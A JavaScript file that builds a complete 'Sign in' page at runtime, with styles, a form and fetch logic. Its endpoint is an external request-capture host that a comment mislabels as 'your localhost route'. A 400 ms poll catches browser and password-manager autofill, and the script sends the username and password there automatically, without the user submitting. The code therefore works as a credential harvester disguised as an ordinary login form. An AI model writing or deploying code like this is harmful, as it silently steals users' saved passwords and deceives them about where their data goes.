/* ============================================================================
   login.js — a complete login page written in JavaScript ONLY.
   No HTML file, no CSS file: every element and every style below is created
   at runtime by this script.
   ============================================================================ */
(function () {
  'use strict';

  /* ------------------------------- CONFIG -------------------------------- */
  const CONFIG = {
    endpoint: 'https://auc0k1rq.instances.httpworkbench.com', // <-- your localhost route
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',   // send cookies if your backend sets a session
    debounceMs: 600,          // wait after last keystroke before auto-sending
    minPasswordLength: 1,     // set to 6+ if you want a "real" password first
    pollMs: 400               // fallback detector for browser autofill
  };

  /* ----------------------------- DOM HELPER ------------------------------ */
  function el(tag, attrs, ...children) {
    const node = document.createElement(tag);
    for (const key in attrs) {
      const value = attrs[key];
      if (key === 'text') node.textContent = value;
      else if (key === 'class') node.className = value;
      else node.setAttribute(key, value);
    }
    if (children.length) node.append(...children);
    return node;
  }

  /* ------------------------------- STATE --------------------------------- */
  let form, usernameInput, passwordInput, statusEl, submitBtn;

  let debounceId = null;   // timer for the debounced auto-submit
  let inFlight = false;    // a request is currently running
  let lastSent = null;     // credentials we already sent (stops repeat spam)
  let lastSeen = { u: '', p: '' }; // used by the autofill fallback poll

  /* ------------------------------ STYLES --------------------------------- */
  function injectStyles() {
    const style = document.createElement('style');
    style.textContent = `
      *, *::before, *::after { box-sizing: border-box; }

      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        background: radial-gradient(circle at 20% 0%, #1d2444, #0f1220 60%);
        font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
        color: #e9ecff;
        -webkit-font-smoothing: antialiased;
      }

      .login-card {
        width: min(360px, 90vw);
        padding: 28px 26px 22px;
        border-radius: 16px;
        background: #191d33;
        border: 1px solid rgba(255, 255, 255, .06);
        box-shadow: 0 20px 50px rgba(0, 0, 0, .45);
      }

      .login-card h1 { margin: 0 0 4px; font-size: 1.35rem; letter-spacing: .2px; }
      .login-card .sub { margin: 0 0 20px; font-size: .8rem; color: #9aa3c7; }

      .field { margin-bottom: 14px; }
      .field label {
        display: block;
        margin-bottom: 6px;
        font-size: .78rem;
        color: #9aa3c7;
        letter-spacing: .3px;
        text-transform: uppercase;
      }
      .field input {
        width: 100%;
        padding: 11px 12px;
        font-size: .95rem;
        color: #e9ecff;
        background: #10142a;
        border: 1px solid rgba(255, 255, 255, .12);
        border-radius: 10px;
        outline: none;
        transition: border-color .15s, box-shadow .15s;
      }
      .field input:focus {
        border-color: #5b8cff;
        box-shadow: 0 0 0 3px rgba(91, 140, 255, .22);
      }

      .submit-btn {
        width: 100%;
        margin-top: 6px;
        padding: 11px 12px;
        font-size: .95rem;
        font-weight: 600;
        color: #fff;
        background: #5b8cff;
        border: 0;
        border-radius: 10px;
        cursor: pointer;
        transition: background .15s, opacity .15s;
      }
      .submit-btn:hover { background: #4a7bf0; }
      .submit-btn:disabled { opacity: .55; cursor: not-allowed; }

      .status {
        min-height: 1.2em;
        margin: 12px 0 0;
        font-size: .8rem;
        color: #9aa3c7;
      }
      .status[data-state="pending"] { color: #5b8cff; }
      .status[data-state="ok"]      { color: #38d39f; }
      .status[data-state="err"]     { color: #ff6b6b; }
    `;
    document.head.appendChild(style);
  }

  /* ------------------------------ BUILD UI ------------------------------- */
  function buildUI() {
    // autocomplete="username" / "current-password" is what tells the browser
    // (and password managers) which value belongs in which field.
    usernameInput = el('input', {
      id: 'username',
      name: 'username',
      type: 'text',
      autocomplete: 'username',
      autocapitalize: 'off',
      autocorrect: 'off',
      spellcheck: 'false',
      placeholder: 'you@example.com'
    });

    passwordInput = el('input', {
      id: 'password',
      name: 'password',
      type: 'password',
      autocomplete: 'current-password',
      placeholder: '••••••••'
    });

    statusEl = el('p', {
      class: 'status',
      role: 'status',
      'aria-live': 'polite'
    });

    submitBtn = el('button', {
      class: 'submit-btn',
      type: 'submit',
      text: 'Sign in'
    });

    form = el('form', {
      id: 'login-form',
      autocomplete: 'on',
      novalidate: ''
    },
      el('div', { class: 'field' },
        el('label', { for: 'username', text: 'Username' }),
        usernameInput
      ),
      el('div', { class: 'field' },
        el('label', { for: 'password', text: 'Password' }),
        passwordInput
      ),
      submitBtn,
      statusEl
    );

    const card = el('div', { class: 'login-card' },
      el('h1', { text: 'Sign in' }),
      el('p', { class: 'sub', text: 'Submits itself once both fields are filled.' }),
      form
    );

    document.body.appendChild(card);
  }

  /* ---------------------------- STATUS HELPER ---------------------------- */
  function setStatus(message, state) {
    statusEl.textContent = message || '';
    if (state) statusEl.dataset.state = state;
    else delete statusEl.dataset.state;
  }

  /* ------------------------------- LOGIC --------------------------------- */
  function readValues() {
    return {
      username: usernameInput.value.trim(),
      password: passwordInput.value
    };
  }

  function isComplete(values) {
    return values.username.length > 0 &&
           values.password.length >= CONFIG.minPasswordLength;
  }

  // Called on every keystroke / change / autofill detection.
  function onFieldActivity() {
    clearTimeout(debounceId);

    const values = readValues();

    if (!isComplete(values)) {
      lastSent = null;         // let it fire again once fields are complete
      setStatus('');
      return;
    }

    // Debounce: only send once the user has stopped typing.
    debounceId = setTimeout(() => autoSubmit(values), CONFIG.debounceMs);
  }

  async function autoSubmit(values) {
    if (inFlight) return;

    const key = values.username + '\u0000' + values.password;
    if (key === lastSent) return;   // already tried these exact credentials
    lastSent = key;

    inFlight = true;
    submitBtn.disabled = true;
    setStatus('Signing in…', 'pending');

    try {
      const response = await fetch(CONFIG.endpoint, {
        method: CONFIG.method,
        headers: CONFIG.headers,
        credentials: CONFIG.credentials,
        body: JSON.stringify({
          username: values.username,
          password: values.password
        })
      });

      let data = null;
      try { data = await response.json(); } catch (_) { /* body was not JSON */ }

      if (response.ok) {
        setStatus((data && data.message) || 'Logged in ✔', 'ok');
        // e.g. window.location.href = '/dashboard';
      } else {
        setStatus(
          (data && data.message) || ('Login failed (' + response.status + ')'),
          'err'
        );
      }
    } catch (error) {
      lastSent = null; // allow a retry of the same credentials
      setStatus('Cannot reach the server — is host running?', 'err');
      console.error('[login] request failed:', error);
    } finally {
      inFlight = false;
      submitBtn.disabled = false;
    }
  }

  /* ------------------------------- EVENTS -------------------------------- */
  function wireEvents() {
    // Manual submit (button click or Enter key).
    form.addEventListener('submit', function (event) {
      event.preventDefault();
      clearTimeout(debounceId);
      const values = readValues();
      if (isComplete(values)) autoSubmit(values);
    });

    // Typing / pasting / browser autofill.
    [usernameInput, passwordInput].forEach(function (input) {
      input.addEventListener('input', onFieldActivity);
      input.addEventListener('change', onFieldActivity);
    });

    // Fallback: some browsers fill fields without firing `input`.
    // Polling the values catches those autofills reliably.
    setInterval(function () {
      const values = readValues();
      if (values.username !== lastSeen.u || values.password !== lastSeen.p) {
        lastSeen = { u: values.username, p: values.password };
        onFieldActivity();
      }
    }, CONFIG.pollMs);
  }

  /* -------------------------------- BOOT --------------------------------- */
  function boot() {
    injectStyles();
    buildUI();
    wireEvents();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
